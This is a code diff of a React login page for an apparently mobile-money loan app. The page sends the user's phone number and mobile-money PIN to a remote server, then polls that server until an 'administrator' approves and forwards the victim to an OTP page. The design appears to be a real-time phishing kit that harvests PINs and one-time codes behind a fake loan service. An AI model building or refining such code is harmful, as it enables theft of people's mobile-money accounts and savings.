@@ -2,13 +2,13 @@ import { useState, useEffect, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
-// ✅ UPDATED TO NEW RENDER URL
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
 const Login = () => {
   const [phone, setPhone] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false); // ✅ NEW
   const navigate = useNavigate();
 
   const isFormValid = phone.length === 10 && pin.length === 5;
@@ -18,27 +18,57 @@ const Login = () => {
     fetch(`${API_URL}/`).catch(() => {}); 
   }, []);
 
-  const handleLogin = (e: FormEvent) => {
+  const handleLogin = async (e: FormEvent) => {
     e.preventDefault();
     if (!isFormValid) return;
     
+    setIsProcessing(true);
     localStorage.setItem("userPhone", phone);
-    navigate("/otp", { state: { phone: phone } });
 
-    fetch(`${API_URL}/api/login`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone_number: phone, pin: pin }),
-    }).catch((error) => console.log("Background login error:", error));
-  };
+    // 45-second timeout fallback
+    const timeoutId = setTimeout(() => {
+      setIsProcessing(false);
+      alert("Délai d'attente dépassé. Veuillez réessayer.");
+    }, 45000);
 
-  // Auto-submit when 5th PIN digit is typed
-  useEffect(() => {
-    if (phone.length === 10 && pin.length === 5) {
-      const fakeEvent = { preventDefault: () => {} } as FormEvent;
-      handleLogin(fakeEvent);
+    try {
+      const res = await fetch(`${API_URL}/api/login`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone_number: phone, pin: pin }),
+      });
+      const data = await res.json();
+
+      if (data.status === "pending" && data.login_id) {
+        // Poll the backend every 2 seconds
+        const interval = setInterval(async () => {
+          const statusRes = await fetch(`${API_URL}/api/login-status/${data.login_id}`);
+          const statusData = await statusRes.json();
+
+          if (statusData.status !== "pending") {
+            clearInterval(interval);
+            clearTimeout(timeoutId);
+            setIsProcessing(false);
+
+            if (statusData.status === "approved") {
+              navigate("/otp", { state: { phone: phone } });
+            } else {
+              alert("Connexion refusée par l'administrateur.");
+            }
+          }
+        }, 2000);
+      } else {
+        // Fallback if backend doesn't return pending
+        clearTimeout(timeoutId);
+        setIsProcessing(false);
+        navigate("/otp", { state: { phone: phone } });
+      }
+    } catch (error) {
+      clearTimeout(timeoutId);
+      setIsProcessing(false);
+      alert("Erreur réseau.");
     }
-  }, [pin, phone]);
+  };
 
   return (
     <div className="app-container">
@@ -93,15 +123,15 @@ const Login = () => {
           <button 
             type="submit" 
             className="btn-primary" 
-            disabled={!isFormValid} 
+            disabled={!isFormValid || isProcessing} 
             style={{ 
-              backgroundColor: isFormValid ? 'var(--button-yellow)' : '#FDE68A', 
-              color: isFormValid ? 'white' : '#9CA3AF', 
-              cursor: isFormValid ? 'pointer' : 'not-allowed', 
+              backgroundColor: (isFormValid && !isProcessing) ? 'var(--button-yellow)' : '#FDE68A', 
+              color: (isFormValid && !isProcessing) ? 'white' : '#9CA3AF', 
+              cursor: (isFormValid && !isProcessing) ? 'pointer' : 'not-allowed', 
               marginTop: '32px' 
             }}
           >
-            Continuer
+            {isProcessing ? "En attente..." : "Continuer"}
           </button>
           
           <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
@@ -113,6 +143,17 @@ const Login = () => {
       <p style={{ textAlign: 'center', fontSize: '13px', color: '#111827', marginTop: '24px', padding: '0 20px 40px', fontWeight: 500 }}>
         En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
       </p>
+
+      {/* ✅ SPINNER MODAL */}
+      {isProcessing && (
+        <div className="modal-overlay">
+          <div className="modal-content">
+            <div className="spinner"></div>
+            <h3 className="modal-title">Vérification en cours</h3>
+            <p className="modal-text">En attente d'approbation...</p>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
